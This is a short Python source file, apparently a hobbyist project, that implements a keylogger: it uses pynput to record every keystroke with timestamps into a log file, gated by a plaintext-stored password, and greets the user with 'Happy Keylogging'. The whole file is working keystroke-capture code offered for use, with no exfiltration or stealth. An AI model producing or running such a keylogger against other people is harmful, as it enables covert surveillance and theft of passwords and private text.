# Danny A
# Python keylogger 
# 8/19/23

import logging
from pynput import keyboard
from pynput.keyboard import Key, Listener

#wtv your file path where you want the log files to be stored put that as logDir

logDir = "C:\\Users\\username\\\\Desktop\\"




logging.basicConfig(

    #sets the configuration for the log file 
    #level DEBUG means it records all logs, thhe format sets the time, the name, the level, and the message
    #filename is the log file name 
    #mode is whats written to 
    
    level=logging.DEBUG,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    filename=(logDir + "key_log.txt"),
    filemode="w"
)

def check_pass():
    print("\n")
    #checks to see if a password file already exists if not sends False and asks the user
    try:
        with open("passwordFile.txt","r") as p:
            passwd = p.read().rstrip().lower()
        return passwd
    
    except FileNotFoundError:
        return None

def set_password():
    print("\n")
    #sets the password if it doesnt already exist when entered by the user
    passwd = input("Since its your first time, Enter the new password: ").rstrip().lower()

    #opens the passwors file and writes the suggested password to it 
    print("\nYou wont be asked again unless the password file is deleted")

    with open("passwordFile.txt","w") as p:
        p.write(passwd)
    return passwd


 
       
def onpress(key):
    #captures the keys being pressed and handles an error even if a special key is pressed 

    try:
        logging.info(str(key))
    except AttributeError: #handles special characters 
        logging.info(str(key))




def main():
    
    value = check_pass()
    if value is not None:
        pcheck = input("Enter the password: ").rstrip()
        with open("passwordFile.txt", "r") as p:
            passwd = p.read().rstrip()
        val = True
        while val:
            if pcheck.lower() == passwd.lower():
                print("Access Granted, Happy Keylogging")
                val = False
            else : 
                 print("Access denied, wrong password")
                 pcheck = input("Enter the password: ").rstrip()
    else:
        passwd = set_password() 
    
    with Listener(on_press=onpress) as listener:
        listener.join()










if __name__ == "__main__":
    print("\n\n\n")
    print("Welcome to My Keylogger")
    
    main()